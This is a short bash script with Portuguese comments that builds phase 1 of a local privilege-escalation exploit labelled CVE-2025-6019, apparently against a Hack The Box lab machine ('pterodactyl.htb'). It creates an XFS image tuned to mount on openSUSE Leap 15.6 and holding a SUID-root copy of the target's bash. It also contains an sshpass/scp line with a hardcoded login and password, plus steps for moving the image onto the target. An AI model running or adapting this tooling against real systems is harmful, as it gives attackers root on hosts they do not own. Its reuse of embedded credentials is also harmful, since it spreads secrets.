#!/bin/bash
# build-xfs-image.sh — CVE-2025-6019 Phase 1
# Cria xfs.image com /bin/bash SUID-root, transferível ao target.
#
# Roda com sudo. Idempotente — se xfs.image existe, refaz.
set -euo pipefail

ENG_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
IMG="$ENG_DIR/exploits/xfs.image"
MNT="$ENG_DIR/exploits/xfs.mount"

# Garantir xfsprogs
if ! command -v mkfs.xfs >/dev/null; then
    echo "[*] Instalando xfsprogs..."
    apt-get install -y xfsprogs >/dev/null
fi

# Limpar montagem anterior se houver
umount "$MNT" 2>/dev/null || true
rm -f "$IMG"

# 1. Imagem vazia 300MB
dd if=/dev/zero of="$IMG" bs=1M count=300 status=none

# 2. XFS com layout legacy — features novas do xfsprogs (rmapbt/exchange/parent)
#    fazem o mount falhar no alvo openSUSE Leap 15.6:
mkfs.xfs -q -f \
    -m crc=1,finobt=1,rmapbt=0,reflink=1,bigtime=0,inobtcount=0 \
    -i sparse=1,nrext64=0,exchange=0 \
    -n parent=0 \
    "$IMG"

# 3. Mount, copia bash DO TARGET (mesma glibc), chmod SUID, unmount
BASH_BIN="$ENG_DIR/exploits/bash-target"
if [[ ! -f "$BASH_BIN" ]]; then
    echo "[-] bash-target ausente — rode antes:"
    echo "    sshpass -p '!QAZ2wsx' scp phileasfogg3@pterodactyl.htb:/bin/bash $BASH_BIN"
    exit 1
fi

mkdir -p "$MNT"
mount -t xfs "$IMG" "$MNT"
cp "$BASH_BIN" "$MNT/bash"
chmod u+s "$MNT/bash"
umount "$MNT"
rmdir "$MNT" 2>/dev/null || true

# Ajustar owner do .image para o user (não root)
chown "${SUDO_USER:-kali}":"${SUDO_USER:-kali}" "$IMG"

echo "[+] $IMG criada ($(stat -c%s "$IMG") bytes)"
echo "[+] Próximo: scp $IMG phileasfogg3@pterodactyl.htb:/tmp/"
